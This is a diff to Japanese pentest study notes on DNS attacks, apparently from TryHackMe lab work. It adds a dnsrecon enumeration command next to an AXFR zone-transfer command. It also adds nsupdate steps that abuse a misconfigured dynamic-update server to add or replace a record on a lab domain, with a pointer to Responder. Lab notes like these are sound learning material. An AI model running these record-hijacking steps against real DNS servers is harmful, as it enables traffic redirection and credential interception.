@@ -4,6 +4,10 @@ https://tryhackme.com/room/dnsmanipulation
 
 https://datatracker.ietf.org/doc/html/rfc1035
 
+```sh
+dnsrecon -d foobar.thm -n $TARGET
+```
+
 ## ゾーン転送
 
 ゾーン設定が次のように誤って設定されている場合
@@ -35,6 +39,35 @@ hipflasks.thm.          86400   IN      SOA     ns1.hipflasks.thm. localhost. 1 
 ```sh
 host -t axfr hipflasks.thm 10.201.95.128
 ```
+
+## DNS動的更新
+
+更新可能な場合の動作。AD & Kerberos 環境では基本的に動的更新可能だが、危険なのは設定不備で「誰でも更新可能」になっている場合。
+
+```sh
+$ nsupdate      
+> server 10.48.173.61
+> update add test.windcorp.thm 600 A 192.168.129.39
+> show
+Outgoing update query:
+;; ->>HEADER<<- opcode: UPDATE, status: NOERROR, id:      0
+;; flags:; ZONE: 0, PREREQ: 0, UPDATE: 0, ADDITIONAL: 0
+;; UPDATE SECTION:
+test.windcorp.thm.      600     IN      A       192.168.129.39
+
+> send
+```
+
+存在する場合は削除してから追加する。
+
+```sh
+> update delete test.windcorp.thm
+> send
+> update add test.windcorp.thm 600 A 192.168.129.39
+> send
+```
+
+pfxファイルを使用してResponderを起動する方法は、pfxファイル.md 参照。
 
 ## iodine
 
